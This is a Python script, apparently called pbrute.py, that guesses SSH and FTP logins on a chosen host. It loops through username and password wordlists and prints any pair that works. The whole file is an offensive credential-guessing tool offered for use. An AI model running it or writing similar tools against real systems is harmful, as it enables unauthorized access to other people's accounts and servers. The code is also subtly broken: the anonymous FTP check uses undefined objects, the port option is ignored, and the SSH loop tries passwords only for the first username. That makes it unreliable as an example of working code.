#!/usr/bin/python3
import optparse
from termcolor import *
from pexpect import *
from pexpect import pxssh
from  threading import *
import ftplib

#Promt=["# ",">>> ","> ",'/$ ']
# Theading needes to added
#port function unavailable

def ftp_connect(thost,tport,ulist,plist):
	u=open(ulist,"r")
	found=0
	
	try:
		print(f"[+]Trying anonymous")
		ftp = FTP(thost) 
		ftps.login()
		print(colored((f"Creds found anonymous:anonymous"),"green",attrs=["bold"]))
		ftp.quit()
		exit(0)
	except:
		print("[-]Anonymous Login not found")
	for username1 in u.readlines():
		username=username1.strip()
		p=open(plist,"r")
		for passwd1 in p.readlines():
			passwd=passwd1.strip()
			print(f"[+] Trying {username}:{passwd}")
			try:
				ftp =ftplib.FTP(thost) 
				login=ftp.login(username,passwd)
				print(colored((f"Creds found {username}:{passwd}"),"green",attrs=["bold"]))
				ftp.quit()
				found=1
			except:
				pass
			if found:
				exit(0)	
		p.close()
	print("[-]Password not  found")











def ssh_login(hostname, username, password):
	try:
		s = pxssh.pxssh()
		s.login(hostname,username,password)
		s.logout()
	except pxssh.ExceptionPxssh as e:
		#print("pxssh failed on login.")
		return e


		
def ssh_connect(thost,tport,ulist,plist):
	u=open(ulist,"r")
	p=open(plist,"r")
	for username1 in u.readlines():
		username=username1.strip()

		for passwd1 in p.readlines():
			passwd=passwd1.strip()
			try:
				print(f"[+]Trying {username}:{passwd}")
				ssh=ssh_login(thost,username,passwd)
			except:
				continue
			if ssh==None:
				print(colored((f"Creds found {username}:{passwd}"),"green",attrs=["bold"]))
				exit(0)
	print("[-]Password not  found")	
				




			


def main():
	parser =optparse.OptionParser('Usage:'+'pbrute.py -m <type of connection eg:ssh,ftp etc  -H <Target host ip/hostname>  -p <target port> -L <usrname list > -P <password list>')
	parser.add_option('-H',dest='thost',type='string',help='specify  target host ')
	parser.add_option('-p',dest='tport',type='string',help='specify  target port')
	parser.add_option('-m',dest='tmode',type='string',help='specify type of connection eg:ssh,ftp etc')
	parser.add_option('-P',dest='passwd',type='string',help='specify password file')
	parser.add_option('-L',dest='usr',type='string',help='specify target file')
	(options,args)=parser.parse_args()
	thost=options.thost
	if (thost==None):
		print(parser.usage)
		exit(0)
	if (options.usr==None):
		ulist="misc/worldlist/username.txt"
	else:
		ulist=options.usr

	if (options.passwd==None):
		plist="misc/worldlist/password.txt"
	else:
		plist=options.passwd        

	udir=colored(f"{ulist}","yellow")
	pdir=colored(f"{plist}","yellow")

	tmode=options.tmode
	if tmode =="ssh":
		if options.tport == None:
			tport="22"
			print(colored(f"[+]ssh on {thost}:{tport}","green"))
			print(f"[!]Usrname worldlist dir:{udir}")
			print(f"[!]Password worldlist dir:{pdir}")
			#t=Thread(target=ssh_connect,args=(thost,tport,ulist,plist))
			#t.start()
			ssh=ssh_connect(thost,tport,ulist,plist)
		else :
			tport=options.tport 
			print(colored(f"[+]ssh on {thost}:{tport}","green"))
			print(f"[!]Usrname worldlist dir:{udir}")
			print(f"[!]Password worldlist dir:{pdir}")
			ssh_connect(thost,tport,ulist,plist)
			#t=Thread(target=ssh_connect,args=(thost,tport,ulist,plist))
			#t.start()

	elif tmode == "ftp":
		if options.tport == None:
			tport="21"
			print(colored(f"[+]ftp on {thost}:{tport}","green"))
			print(f"[!]Usrname worldlist dir:{udir}")
			print(f"[!]Password worldlist dir:{pdir}")
			ftp_connect(thost,tport,ulist,plist)
		else :
			tport=options.tport 
			print(colored(f"[+]ssh on {thost}:{tport}","green"))
			print(f"[!]Usrname worldlist dir:{udir}")
			print(f"[!]Password worldlist dir:{pdir}")
			ftp_connect(thost,tport,ulist,plist)
			
	else:
		print("tmode eq wrong")
		print(parser.usage)
		exit(0)



if __name__=='__main__':
	main()




































